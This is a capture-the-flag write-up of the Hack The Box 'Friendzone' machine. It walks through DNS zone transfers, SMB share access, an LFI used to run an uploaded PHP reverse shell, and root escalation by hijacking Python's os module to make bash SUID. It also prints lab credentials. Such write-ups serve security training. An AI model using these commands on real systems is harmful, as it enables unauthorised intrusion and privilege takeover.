---
title: "Friendzone"
date: 2023-09-11T19:13:39+02:00
tags: ["privesc","web","linux"]
categories: ["hackthebox"]
author: "Ayman Boulaich"
showToc: true
TocOpen: false
draft: false
hidemeta: false
comments: false
summary: "Linux machine with a website which has LFI and thanks to be able to upload resources to the machine via smb we pwnd the user. A Library Hijacking vulnerability help us to privEsc as root."
description: "Linux machine with a website which has LFI and thanks to be able to upload resources to the machine via smb we pwnd the user. A Library Hijacking vulnerability help us to privEsc as root."
canonicalURL: "https://canonical.url/to/page"
disableHLJS: true # to disable highlightjs
disableShare: true
disableHLJS: false
hideSummary: false
searchHidden: true
ShowReadingTime: true
ShowBreadCrumbs: true
ShowPostNavLinks: false
ShowWordCount: true
ShowRssButtonInSectionTermList: true
UseHugoToc: true
cover:
    image: "<image path/url>" # image path/url
    alt: "<alt text>" # alt text
    caption: "<text>" # display caption under cover
    relative: false # when using page bundles set this to true
    hidden: true # only hide on current single page
editPost:
    URL: "https://github.com/pwndside/pwndside.github.io/content"
    Text: "Suggest Changes" # edit text
    appendFilePath: true # to append file path to Edit link
---

## Room Information

- Room name: Friendzone
- Difficulty level: Easy
- Room link: https://app.hackthebox.com/machines/Friendzone

![Untitled](/HTB/friend-icon.png)

## Tools Used

- nmap

## Port Scanning

```bash
sudo nmap $IP -n -Pn -vvv --min-rate 5000
```

```bash
PORT    STATE SERVICE     REASON         VERSION
21/tcp  open  ftp         syn-ack ttl 63 vsftpd 3.0.3
22/tcp  open  ssh         syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 a9:68:24:bc:97:1f:1e:54:a5:80:45:e7:4c:d9:aa:a0 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC4/mXYmkhp2syUwYpiTjyUAVgrXhoAJ3eEP/Ch7omJh1jPHn3RQOxqvy9w4M6mTbBezspBS+hu29tO2vZBubheKRKa/POdV5Nk+A+q3BzhYWPQA+A+XTpWs3biNgI/4pPAbNDvvts+1ti+sAv47wYdp7mQysDzzqtpWxjGMW7I1SiaZncoV9L+62i+SmYugwHM0RjPt0HHor32+ZDL0hed9p2ebczZYC54RzpnD0E/qO3EE2ZI4pc7jqf/bZypnJcAFpmHNYBUYzyd7l6fsEEmvJ5EZFatcr0xzFDHRjvGz/44pekQ40ximmRqMfHy1bs2j+e39NmsNSp6kAZmNIsx
|   256 e5:44:01:46:ee:7a:bb:7c:e9:1a:cb:14:99:9e:2b:8e (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOPI7HKY4YZ5NIzPESPIcP0tdhwt4NRep9aUbBKGmOheJuahFQmIcbGGrc+DZ5hTyGDrvlFzAZJ8coDDUKlHBjo=
|   256 00:4e:1a:4f:33:e8:a0:de:86:a6:e4:2a:5f:84:61:2b (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIF+FZS11nYcVyJgJiLrTYTIy3ia5QvE3+5898MfMtGQl
53/tcp  open  domain      syn-ack ttl 63 ISC BIND 9.11.3-1ubuntu1.2 (Ubuntu Linux)
| dns-nsid:
|_  bind.version: 9.11.3-1ubuntu1.2-Ubuntu
80/tcp  open  http        syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-methods:
|_  Supported Methods: HEAD GET POST OPTIONS
|_http-title: Friend Zone Escape software
139/tcp open  netbios-ssn syn-ack ttl 63 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
443/tcp open  ssl/http    syn-ack ttl 63 Apache httpd 2.4.29
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: 404 Not Found
| http-methods:
|_  Supported Methods: HEAD GET POST OPTIONS
| tls-alpn:
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=friendzone.red/organizationName=CODERED/stateOrProvinceName=CODERED/countryName=JO/organizationalUnitName=CODERED/localityName=AMMAN/emailAddress=haha@friendzone.red
| Issuer: commonName=friendzone.red/organizationName=CODERED/stateOrProvinceName=CODERED/countryName=JO/organizationalUnitName=CODERED/localityName=AMMAN/emailAddress=haha@friendzone.red
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2018-10-05T21:02:30
| Not valid after:  2018-11-04T21:02:30
| MD5:   c144:1868:5e8b:468d:fc7d:888b:1123:781c
| SHA-1: 88d2:e8ee:1c2c:dbd3:ea55:2e5e:cdd4:e94c:4c8b:9233
| -----BEGIN CERTIFICATE-----
| MIID+DCCAuCgAwIBAgIJAPRJYD8hBBg0MA0GCSqGSIb3DQEBCwUAMIGQMQswCQYD
| VQQGEwJKTzEQMA4GA1UECAwHQ09ERVJFRDEOMAwGA1UEBwwFQU1NQU4xEDAOBgNV
| BAoMB0NPREVSRUQxEDAOBgNVBAsMB0NPREVSRUQxFzAVBgNVBAMMDmZyaWVuZHpv
| bmUucmVkMSIwIAYJKoZIhvcNAQkBFhNoYWhhQGZyaWVuZHpvbmUucmVkMB4XDTE4
| MTAwNTIxMDIzMFoXDTE4MTEwNDIxMDIzMFowgZAxCzAJBgNVBAYTAkpPMRAwDgYD
| VQQIDAdDT0RFUkVEMQ4wDAYDVQQHDAVBTU1BTjEQMA4GA1UECgwHQ09ERVJFRDEQ
| MA4GA1UECwwHQ09ERVJFRDEXMBUGA1UEAwwOZnJpZW5kem9uZS5yZWQxIjAgBgkq
| hkiG9w0BCQEWE2hhaGFAZnJpZW5kem9uZS5yZWQwggEiMA0GCSqGSIb3DQEBAQUA
| A4IBDwAwggEKAoIBAQCjImsItIRhGNyMyYuyz4LWbiGSDRnzaXnHVAmZn1UeG1B8
| lStNJrR8/ZcASz+jLZ9qHG57k6U9tC53VulFS+8Msb0l38GCdDrUMmM3evwsmwrH
| 9jaB9G0SMGYiwyG1a5Y0EqhM8uEmR3dXtCPHnhnsXVfo3DbhhZ2SoYnyq/jOfBuH
| gBo6kdfXLlf8cjMpOje3dZ8grwWpUDXVUVyucuatyJam5x/w9PstbRelNJm1gVQh
| 7xqd2at/kW4g5IPZSUAufu4BShCJIupdgIq9Fddf26k81RQ11dgZihSfQa0HTm7Q
| ui3/jJDpFUumtCgrzlyaM5ilyZEj3db6WKHHlkCxAgMBAAGjUzBRMB0GA1UdDgQW
| BBSZnWAZH4SGp+K9nyjzV00UTI4zdjAfBgNVHSMEGDAWgBSZnWAZH4SGp+K9nyjz
| V00UTI4zdjAPBgNVHRMBAf8EBTADAQH/MA0GCSqGSIb3DQEBCwUAA4IBAQBV6vjj
| TZlc/bC+cZnlyAQaC7MytVpWPruQ+qlvJ0MMsYx/XXXzcmLj47Iv7EfQStf2TmoZ
| LxRng6lT3yQ6Mco7LnnQqZDyj4LM0SoWe07kesW1GeP9FPQ8EVqHMdsiuTLZryME
| K+/4nUpD5onCleQyjkA+dbBIs+Qj/KDCLRFdkQTX3Nv0PC9j+NYcBfhRMJ6VjPoF
| Kwuz/vON5PLdU7AvVC8/F9zCvZHbazskpy/quSJIWTpjzg7BVMAWMmAJ3KEdxCoG
| X7p52yPCqfYopYnucJpTq603Qdbgd3bq30gYPwF6nbHuh0mq8DUxD9nPEcL8q6XZ
| fv9s+GxKNvsBqDBX
|_-----END CERTIFICATE-----
445/tcp open              syn-ack ttl 63 Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
Service Info: Hosts: FRIENDZONE, 127.0.1.1; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| nbstat: NetBIOS name: FRIENDZONE, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| Names:
|   FRIENDZONE<00>       Flags: <unique><active>
|   FRIENDZONE<03>       Flags: <unique><active>
|   FRIENDZONE<20>       Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
|   WORKGROUP<00>        Flags: <group><active>
|   WORKGROUP<1d>        Flags: <unique><active>
|   WORKGROUP<1e>        Flags: <group><active>
| Statistics:
|   00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00
|   00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00
|_  00:00:00:00:00:00:00:00:00:00:00:00:00:00
|_clock-skew: mean: -1h00m00s, deviation: 1h43m55s, median: -1s
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2023-09-06T15:35:12
|_  start_date: N/A
| p2p-conficker:
|   Checking for Conficker.C or higher...
|   Check 1 (port 60332/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 29635/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 37865/udp): CLEAN (Failed to receive data)
|   Check 4 (port 49559/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb-os-discovery:
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: friendzone
|   NetBIOS computer name: FRIENDZONE\x00
|   Domain name: \x00
|   FQDN: friendzone
|_  System time: 2023-09-06T18:35:12+03:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
```

The scan shows 7 ports up and running, 80 and 443 are running web servers, 139 and 445 are smb ports, 22 for ssh, 21 for ftp and 25 is running a ISC service which is a kind of DNS.

I’ll take careful notice of the domain in the TLS certificate, `commonName=friendzone.red`

## Enumeration

As always I am gonna start with the websites.

First let’s start with the http server.

![Untitled](/HTB/friend-1.png)

Te homepage leaks a email with a URL `friendzoneportal.red` maybe there is virtualhosting in the website.

```bash
gobuster dir -u http://friendzone.red/ -w ~/Documents/wordlists/KaliLists/dirb/common.txt -x php,html,css,js,py,txt -t 100 -o fuzz | tee fuzz.save
```

```bash
/index.html           (Status: 200) [Size: 324]
/robots.txt           (Status: 200) [Size: 13]
/server-status        (Status: 403) [Size: 300]
/wordpress            (Status: 301) [Size: 316] [--> http://10.10.10.123/wordpress/]
```

After a quick fuzz two directories are shown

`/robots.txt` is troll.

![Untitled](/HTB/friend-2.png)

`/wordpress` is empty.

![Untitled](/HTB/friend-3.png)

So let’s move to the ssl site.

![Untitled](/HTB/friend-4.png)

![Untitled](/HTB/friend-5.png)

In the homepage we found normal gif but if we access to the source code there is a comment leaking a directory `/js/js` on development.

![Untitled](/HTB/friend-6.png)

The directory `/js/js` is a page which maybe something is being tested. 

There are also some hidden comments at the source code.

```html
<p>Testing some functions !</p><p>I'am trying not to break things !</p>
SkUyRVFwSlF2VzE2OTQzMzc4MjIybkJLbUE5RVdN
<!-- dont stare too much , you will be smashed ! , it's all about times and zones ! -->
```

I don’t know what are they referring to, but you have to keep in mind that it could just be a rabbit hole.

Let’s do a quick fuzz

```bash
gobuster dir -u https://friendzone.red/ -w ~/Documents/wordlists/KaliLists/dirb/common.txt -x php,html,css,js,py,txt -t 100 -o fuzz | tee fuzz.save
```

```bash
/admin                (Status: 301) [Size: 318] [--> https://friendzone.red/admin/]
/index.html           (Status: 200) [Size: 238]
/js                   (Status: 301) [Size: 315] [--> https://friendzone.red/js/]
/server-status        (Status: 403) [Size: 303]
```

Again, only two directories are displayed

![Untitled](/HTB/friend-7.png)

`/admin` is a empty directory as `/wordpress` in the http site.

![Untitled](/HTB/friend-8.png)

`/js` lists only one directory named `/js` which is the one we have already visited.

If we return to the nmap scan there, the TCP port 53 is for DNS which means that maybe this is associated with Zone Transfers, where the server give all the information it has for a domain. Before doing any virtual hosting scans I checked Zone Transfers for enumerating DNS.

As we have two domains let’s see what outputs dig command.

```bash
dig @10.10.10.123 friendzone.red axfr 
```

```bash
; <<>> DiG 9.10.6 <<>> @10.10.10.123 friendzone.red axfr
; (1 server found)
;; global options: +cmd
friendzone.red.		604800	IN	SOA	localhost. root.localhost. 2 604800 86400 2419200 604800
friendzone.red.		604800	IN	AAAA	::1
friendzone.red.		604800	IN	NS	localhost.
friendzone.red.		604800	IN	A	127.0.0.1
administrator1.friendzone.red. 604800 IN A	127.0.0.1
hr.friendzone.red.	604800	IN	A	127.0.0.1
uploads.friendzone.red.	604800	IN	A	127.0.0.1
friendzone.red.		604800	IN	SOA	localhost. root.localhost. 2 604800 86400 2419200 604800
;; Query time: 110 msec
;; SERVER: 10.10.10.123#53(10.10.10.123)
;; WHEN: Sun Sep 10 12:07:34 CEST 2023
;; XFR size: 8 records (messages 1, bytes 261)
```

```bash
dig @10.10.10.123 friendzoneportal.red axfr
```

```bash
; <<>> DiG 9.10.6 <<>> @10.10.10.123 friendzoneportal.red axfr
; (1 server found)
;; global options: +cmd
friendzoneportal.red.	604800	IN	SOA	localhost. root.localhost. 2 604800 86400 2419200 604800
friendzoneportal.red.	604800	IN	AAAA	::1
friendzoneportal.red.	604800	IN	NS	localhost.
friendzoneportal.red.	604800	IN	A	127.0.0.1
admin.friendzoneportal.red. 604800 IN	A	127.0.0.1
files.friendzoneportal.red. 604800 IN	A	127.0.0.1
imports.friendzoneportal.red. 604800 IN	A	127.0.0.1
vpn.friendzoneportal.red. 604800 IN	A	127.0.0.1
friendzoneportal.red.	604800	IN	SOA	localhost. root.localhost. 2 604800 86400 2419200 604800
;; Query time: 104 msec
;; SERVER: 10.10.10.123#53(10.10.10.123)
;; WHEN: Sun Sep 10 12:08:07 CEST 2023
;; XFR size: 9 records (messages 1, bytes 281)
```

Cool we have a bunch of possible subdomains, let’s put them on `/etc/hosts`

First I tried to access to each subdomain with the http port but seem to go back to the same site so I started to do it with ssl site instead.

| Domain | Comments |
| --- | --- |
| administrator1.friendzone.red | Seems a admin page |
| uploads.friendzone.red | Fake uploads site |
| hr.friendzone.red | Not Found |
| friendzoneportal.red | Only a GIF of Michael Jackson |
| admin.friendzoneportal.red | When I try to put any creds shows “Admin page is not developed yet !!! check for another one” |
| files.friendzoneportal.red | Not Found |
| imports.friendzoneportal.red | Not Found |
| vpn.friendzoneportal.red | Not Found |

[`administrator1.friendzone.red`](http://administrator1.friendzone.red) is the only one which seems working but need a valid credentials. I tried some common credentials but failed.

Let’s move now to other ports. 

I started with the ftp service. I tried to log in anonymously but the login failed

So I decided to try to access to smb instead, using smbmap I can access anonymously and see what permissions I have on the shares.

![Untitled](/HTB/friend-9.png)

Interesting the Files shares comment show his directory so we can assume that all the directories are located at `/etc` without doing any enumeration.

Thanks to smbmap we also know that general is only readable and Development is readable and writeable.

![Untitled](/HTB/friend-11.png)

Development seems empty.

![Untitled](/HTB/friend-10.png)

general has only one file with credentials.

```
creds for the admin THING:

admin:WORKWORKHhallelujah@#
```

Maybe there are credentials for the admin site.

## Exploiting

![Untitled](/HTB/friend-12.png)

Once logged in in the admin page, the site tells yo to visit to the dashboard.

![Untitled](/HTB/friend-13.png)

In order to show the image we need to put the two default parameters.

`image_id=a.jpg&pagename=timestamp`

![Untitled](/HTB/friend-14.png)

Interesting pagename points to timestamp and if the input is not being sanitized maybe we can change the input to other file.

I tried to point to the dashboard.php page but the site is not loading.

After that I realized that the code is putting .php at the end of the input.

`image_id=a.jpg&pagename=dashboard`

![Untitled](/HTB/friend-15.png)

The site is loading infinite times so we can assume that we have LFI with php files.

Now we have LFI and if we remember the samba shares are pointing to folders on the `/etc` directory so we are able to upload a shell and make it run with the pagename parameter.

The only share which is writable is the Development folder so I tried to upload a php reverse shell. As always I am gonna using the [pentestmonkey](https://pentestmonkey.net/tools/web-shells/php-reverse-shell) one

```bash
smbmap -H 10.10.10.123 --upload './shell.php' 'Development\shell.php'
```

Now let’s set a nc listener and run the php reverse shell with the next parameters `image_id=a.jpg&pagename=../../../../../../etc/Development/shell`

```bash
nc -lv 4444
```

## Gaining an Initial Foothold

![Untitled](/HTB/friend-16.png)

Great we are **www-data** now.

## Escalating Privilege

![Untitled](/HTB/friend-17.png)

If we check the `/var/www` directory where are located all the sites we can see a suspicious mysql file.

```bash
for development process this is the mysql creds for user friend

db_user=friend

db_pass=Agpyu12!0.213$

db_name=FZ
```

Seems credentials for access to a mysql database, but let’s see if there is a password reuse.

I tried to access to the user friend with the command `su friend`

![Untitled](/HTB/friend-20.png)

Awesome we are logged as normal user.

![Untitled](/HTB/friend-19.png)

Now it’s time to privEsc.

As always I checked for unusual processes or open ports but I don’t found anything and then I have searched for SUID files to exploit but there was nothing exploitable.

Once done the initial check I start the scan of scheduled processes with [moniProc.sh](http://moniProc.sh) which I have used in a lot of writeups.

```bash
> /usr/sbin/CRON -f
> /bin/sh -c /opt/server_admin/reporter.py
> /usr/bin/python /opt/server_admin/reporter.py
```

A cronjob is executing a python script, let’s check his content.

```python
#!/usr/bin/python

import os

to_address = "admin1@friendzone.com"
from_address = "admin2@friendzone.com"

print "[+] Trying to send email to %s"%to_address

#command = ''' mailsend -to admin2@friendzone.com -from admin1@friendzone.com -ssl -port 465 -auth -smtp smtp.gmail.co-sub scheduled results email +cc +bc -v -user you -pass "PAPAP"'''

#os.system(command)

# I need to edit the script later
# Sam ~ python developer
```

The scripts doesn’t seems exploitable but is using the os library, if this library is vulnerable to Library Hijacking we are able to execute whatever we want.

The attack explanation is simple, the searched python module will be located in one of the defined paths, but if Python finds a module with the ***same*** name in a folder with higher priority, it will import that module instead of the “legit” one.

We can know the Python Path with the following command.

```python
python -c 'import sys; print(sys.path)'
```

```python
['', '/usr/lib/python2.7', '/usr/lib/python2.7/plat-x86_64-linux-gnu', '/usr/lib/python2.7/lib-tk', '/usr/lib/python2.7/lib-old', '/usr/lib/python2.7/lib-dynload', '/usr/local/lib/python2.7/dist-packages', '/usr/lib/python2.7/dist-packages']
```

The first path that python will check will be the script directory, if nothing is located at the script directory python will check all the remaining paths.

![Untitled](/HTB/friend-21.png)

As we can’t write anything on the script folder, we need to check if any folder containing os.py module is writable in order to perform the attack.

![Untitled](/HTB/friend-22.png)

As we know the first folder python will check is the `/usr/lib/python2.7`, let’s check if we can modify the module.

![Untitled](/HTB/friend-23.png)

We have permissions to edit the file so we can put the following line of code which is going to be executed always when we import the library.

```python
system('chmod 4755 /bin/bash')
```

As the cronjob is executed as root, we are able to execute commands as the above which helps us to privEsc changing the bash permissions to that of a SUID file.

Now only rests to wait.

![Untitled](/HTB/friend-26.gif)

If we execute the following command the current bash session is gonna turn to a root session.

```python
bash -p
```

![Untitled](/HTB/friend-24.png)

![Untitled](/HTB/friend-25.png)

